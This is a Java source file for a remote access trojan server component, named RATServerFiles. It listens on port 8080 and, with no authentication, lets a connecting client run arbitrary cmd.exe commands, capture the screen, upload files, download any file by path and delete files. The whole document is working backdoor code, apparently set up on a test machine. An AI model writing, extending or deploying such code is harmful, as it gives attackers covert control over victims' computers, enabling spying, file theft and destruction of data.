import java.awt.*;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;

public class RATServerFiles {
    public static void main(String[] args) {
        System.out.println("[Server] Starting...");
        try (ServerSocket serverSocket = new ServerSocket(8080)) {
            System.out.println("[Server] Started. Waiting for connection...");

            while (true) {
                try (Socket clientSocket = serverSocket.accept();
                     DataInputStream in = new DataInputStream(new BufferedInputStream(clientSocket.getInputStream()));
                     DataOutputStream out = new DataOutputStream(new BufferedOutputStream(clientSocket.getOutputStream()))) {

                    System.out.println("[Server] Client connected at: '" + clientSocket.getInetAddress().getHostAddress() + "'");

                    String command;
                    while ((command = in.readUTF()) != null) {
                        command = command.trim();
                        System.out.println("\n[Server] Received command: " + command);

                    try {

                        if ("TAKE_SCREENSHOT".equals(command)) {
                            takeScreenshot(out);
                        } else if ("UPLOAD".equals(command)) {
                            receiveFile(in);
                        } else if ("DOWNLOAD".equals(command)) {
                            sendFile(out, in.readUTF());
                        } else if ("DELETE".equals(command)) {
                            deleteFile(out, in.readUTF());
                        } else {
                            String output = executeCommand(command);
                            out.writeUTF(output);
                            out.writeUTF("END_OF_RESPONSE");
                            System.out.println("[Server] Command executed: " + command);
                        }
                    }
                    catch (AWTException e) {
                        System.err.println("[Server] AWT error: " + e.getMessage());
                    } catch (IOException e) {
                        System.err.println("[Server] IO error: " + e.getMessage());
                    } catch (Exception e) {
                        System.err.println("[Server] General error: " + e.getMessage());
                    }
                        out.flush();
                        System.out.println("[Server] Execution successful, waiting for new input...");
                    }
                } catch (IOException e) {
                    System.err.println("[Server] Client disconnected or error occurred: " + e.getMessage());
                    System.out.println("[Server] Waiting for new connection...");
                }
            }
        } catch (IOException e) {
            System.err.println("[Server] Server Error: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private static void takeScreenshot(DataOutputStream out) throws AWTException, IOException {
        Robot robot = new Robot();
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
        String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        File outputFile = new File("C:\\Users\\Test\\Pictures\\screenshot_" + timestamp + ".jpg");
        ImageIO.write(screenFullImage, "jpg", outputFile);
        out.writeUTF("Screenshot taken and saved as " + outputFile.getName());
        out.writeUTF("END_OF_RESPONSE");
        System.out.println("[Server] Screenshot taken: " + outputFile.getName());
    }

    private static String executeCommand(String command) {
        StringBuilder output = new StringBuilder();
        try {
            ProcessBuilder builder = new ProcessBuilder();
            builder.command("cmd.exe", "/c", command);
            builder.redirectErrorStream(true);
            Process process = builder.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            int exitVal = process.waitFor();
            System.out.println("[Server] Command '" + command + "' executed with exit value: " + exitVal);
        } catch (Exception e) {
            output.append("Error executing command: ").append(e.getMessage());
            System.err.println("[Server] Error executing command '" + command + "': " + e.getMessage());
        }
        return output.toString();
    }

    private static void receiveFile(DataInputStream in) throws IOException {
        String fileName = in.readUTF();
        long fileSize = in.readLong();
        try (FileOutputStream fos = new FileOutputStream("C:\\Users\\Test\\Downloads\\" + fileName)) {
            byte[] buffer = new byte[4096];
            int read;
            long totalRead = 0;
            while (totalRead < fileSize && (read = in.read(buffer, 0, Math.min(buffer.length, (int)(fileSize - totalRead)))) != -1) {
                fos.write(buffer, 0, read);
                totalRead += read;
            }
        }
        System.out.println("[Server] File received: " + fileName);
    }

    private static void sendFile(DataOutputStream out, String filePath) throws IOException {
        File file = new File(filePath);
        if (file.exists()) {
            out.writeLong(file.length());
            try (FileInputStream fis = new FileInputStream(file)) {
                byte[] buffer = new byte[4096];
                int read;
                while ((read = fis.read(buffer)) != -1) {
                    out.write(buffer, 0, read);
                }
            }
            out.flush();
            System.out.println("[Server] File sent: " + filePath);
        } else {
            out.writeLong(0); // Indicate file not found
            System.out.println("[Server] File not found: " + filePath);
        }
    }
    

    private static void deleteFile(DataOutputStream out, String filePath) throws IOException {
    File file = new File(filePath);
    if (file.exists()) {
        if (file.delete()) {
            System.out.println("[Server] File deleted: " + filePath);
            out.writeUTF("File deleted: " + filePath);
        } else {
            System.out.println("[Server] File could not be deleted: " + filePath);
            out.writeUTF("File could not be deleted: " + filePath);
        }
    } else {
        System.out.println("[Server] File not found: " + filePath);
        out.writeUTF("File not found: " + filePath);
    }
    out.writeUTF("END_OF_RESPONSE");
    out.flush();
}

    
}
